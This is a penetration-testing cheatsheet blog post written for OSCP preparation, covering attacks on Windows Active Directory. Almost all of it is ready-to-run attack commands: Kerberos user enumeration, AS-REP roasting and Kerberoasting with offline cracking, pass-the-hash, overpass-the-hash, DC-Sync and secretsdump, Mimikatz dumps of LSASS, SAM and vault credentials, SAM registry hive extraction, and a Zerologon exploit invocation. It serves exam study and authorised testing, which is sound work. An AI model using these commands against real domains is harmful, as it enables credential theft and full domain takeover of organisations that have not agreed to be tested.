---
title: Active Directory
author: sKyW1per 
category: "OSCP"
date: "2021-03-14 00:01"
tags: [OSCP, Cheatsheet]
layout: post
---


###### A Few Basic Domain Enumeration Commands
```
$ net user /domain
$ net user some_admin /domain
$ net group /domain
$ net accounts

Powershell:
$ [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrent
Domain()
```

###### Bloodhound
```
Bloodhound documentation:
https://bloodhound.readthedocs.io/en/latest/

Installation:
$ sudo apt install bloodhound
$ sudo pip3 install bloodhound

First, gather the data with an ingestor, either the bloodhound-python script from fox-it or SharpHound.Then import the json files in the neo4j database.
$ (sudo) neo4j console
starts on localhost:7687

Examples bloodhound-python:
$ bloodhound-python -c All -u 'username' -p 'password' -d "domain.local" -ns 10.10.10.10
$ bloodhound-python -c All -u 'username' -p 'password' -gc "MACHINE.domain.local" -dc "MACHINE.domain.local" -d "domain.local" -ns 10.10.10.10

Example SharpHound
$ cp /usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1 ./
$ cp /usr/lib/bloodhound/resources/app/Collectors/SharpHound.exe ./

$ Import-module .\SharpHound.ps1
$ Invoke-Bloodhound -CollectionMethod All [-d domain.local]
Or at once:
$ powershell -exec bypass -command "& { Import-Module SharpHound.ps1; Invoke-Bloodhound -CollectionMethod All; }"
```

###### PowerView
```
$ cp /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 ./

$ Import-Module .\PowerView.ps1
$ Get-NetLoggedon -ComputerName computer1
$ Get-NetSession -ComputerName dc01
```

###### Compiling Rubeus
```
https://github.com/GhostPack/Rubeus

Instructions:
https://github.com/GhostPack/Rubeus#compile-instructions
https://specterops.gitbook.io/ghostpack/rubeus/introduction/compilation-instructions

Or get a pre-compiled version here:
https://github.com/Flangvik/SharpCollection
```

###### Kerberos ~ validating usernames
```
https://github.com/ropnop/kerbrute
./kerbrute userenum --dc 10.10.10.10 -d domain.htb users.txt
```

###### Kerberos ~ AS-REP Roasting
```
From external with Impacket:
$ impacket-GetNPUsers domain.local/ -format john -usersfile users.txt -no-pass -dc-ip 10.10.10.10

With Rubeus:
$ .\Rubeus.exe asreproast
$ .\Rubeus.exe asreproast /user:username /domain:domain.local /format:hashcat /outfile:file.out

Password dictionary attack:
$ john tgt-file --wordlist=/usr/share/wordlists/rockyou.txt
or:
$ hashcat -a 0 -m 18200 tgt-file /usr/share/wordlists/rockyou.txt --force
```

###### Kerberos ~ Kerberoasting
```
From external with Impacket:
$ impacket-GetUserSPNs -request -dc-ip 10.10.10.10 domain.local/username -save -outputfile tgsfile.out

List TGT's:
$ klist

Get a TGT with Rubeus:
$ .\Rubeus.exe asktgt /user:SYSTEM-NAME$ /rc4:h1a2s3h4 /ptt

Kerberoasting With Rubeus:
$ .\Rubeus.exe kerberoast
$ .\Rubeus.exe kerberoast /user:username /domain:domain.local /format:hashcat /outfile:file.out

Password dictionary attack:
$ john tgs-file --wordlist=/usr/share/wordlists/rockyou.txt
or:
$ hashcat -m 13100 -a 0 tgsfile.out /usr/share/wordlists/rockyou.txt --force
```

###### Overpass the hash / Pass The Key
```
Start powershell as the targeted user with mimikatz using the ntlm hash:
$ sekurlsa::pth /user:username /domain:domain.local /ntlm:h1a2s3h4 /run:PowerShell.exe
using this powershell instance, authenticate to domain controller dc01 so a ticket is generated:
$ net use \\dc01
Or open a shell on domain controller dc01:
$ PsExec.exe \\dc01 cmd.exe
```

###### More Kerberos attacks:
```
https://pentestbook.six2dez.com/post-exploitation/windows/ad/kerberos-attacks
```

###### DC-SYNC attack
```
From external with impacket-secretsdump:
$ impacket-secretsdump domain/username@10.10.10.10
$ impacket-secretsdump domain/username@10.10.10.10 -just-dc
$ impacket-secretsdump domain/username:password@10.10.10.10

with Mimikatz:
$ lsadump::dcsync /domain:domain.local /user:Administrator
```


###### Pass The Hash with CrackMapExec
```
$ crackmapexec smb 10.10.10.10 -u username -H h1a2s3h4:h1a2s3h4
```

###### Pass the Hash with PTH
```
$ pth-winexe -U username%hAsHPaRt1:hAsHPaRt2 //10.10.10.10 cmd
```

###### Mimikatz ~ Retrieve stored credentials
```
https://github.com/gentilkiwi/mimikatz
$ cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe ./

Older Mimikatz version:
https://github.com/gentilkiwi/mimikatz/files/4167347/mimikatz_trunk.zip

Start Mimikatz from CMD
$ .\mimikatz.exe
$ privilege::debug
$ token::elevate

Save output of the next commands in a file:
$ log file.out

sekurlsa
$ sekurlsa::logonpasswords
$ sekurlsa::tickets

kerberos
$ kerberos::list

vault
$ vault::cred
$ vault::list

lsadump
$ lsadump::sam
$ lsadump::secrets
$ lsadump::cache
$ token::revert
```

###### Retrieve stored credentials (manual)
```
view stored kerberos tickets:
$ klist

gather NTLM hashes with nishang script:
https://github.com/samratashok/nishang/tree/master/Gather
$ Import-Module .\Get-PassHashes.ps1
$ Get-PassHashes
```

###### SAM Hashdump (manual)
```
Dumping SAM hashes from CMD:
https://miloserdov.org/?p=4129

$ reg save hklm\sam c:\sam
$ reg save hklm\system c:\system

Location:
C:/Windows/System32/config/SAM
C:/Windows/System32/config/SYSTEM
```

###### Zerologon (probably going to break the domain, not recommended..)
```
$ searchsploit -m 49871.py
$ python3 49871.py -do check -target NETBIOSNAME -ip 10.10.10.10
```
